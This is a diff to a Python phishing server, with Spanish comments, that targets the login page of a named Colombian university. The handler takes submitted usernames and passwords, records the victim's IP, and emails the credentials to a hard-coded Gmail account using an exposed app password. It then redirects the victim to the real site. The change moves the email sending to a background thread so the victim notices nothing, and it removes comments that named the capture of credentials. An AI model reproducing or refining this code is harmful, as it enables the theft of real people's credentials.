@@ -3,10 +3,11 @@ import urllib.parse
 import datetime
 import os
 import smtplib
+import threading
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
-# CONFIGURACION PARA NOTIFICACIONES (Donde quieres recibir las credenciales capturadas)
+# CONFIGURACION PARA NOTIFICACIONES
 CORREO_NOTIFICACION = "marlonmoncayo7474@gmail.com"
 PASSWORD_NOTIFICACION = "jpwy hpdh lnuy tpaw"  # Tu contraseña de aplicación de Gmail
 
@@ -54,16 +55,16 @@ class PhishingHandler(http.server.SimpleHTTPRequestHandler):
         usuario = params.get('usuario', [''])[0]
         clave = params.get('clave', [''])[0]
         
-        # Obtener la IP real de la víctima a través de los encabezados de Render
         ip = self.headers.get('X-Forwarded-For', self.client_address[0])
         fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
         print(f"\n[¡ALERTA! CREDENCIALES CAPTURADAS] Usuario: {usuario} | Clave: {clave} | IP: {ip}")
         
-        # Enviar correo de notificación automático a ti
-        enviar_alerta_correo(usuario, clave, ip, fecha)
+        # Enviar el correo en segundo plano para no congelar la página
+        hilo_correo = threading.Thread(target=enviar_alerta_correo, args=(usuario, clave, ip, fecha))
+        hilo_correo.start()
         
-        # Redirigir a la víctima al sitio real de la universidad
+        # Redirigir de inmediato a la víctima al sitio real
         self.send_response(302)
         self.send_header('Location', 'https://sigedin.uniputumayo.edu.co/login')
         self.end_headers()
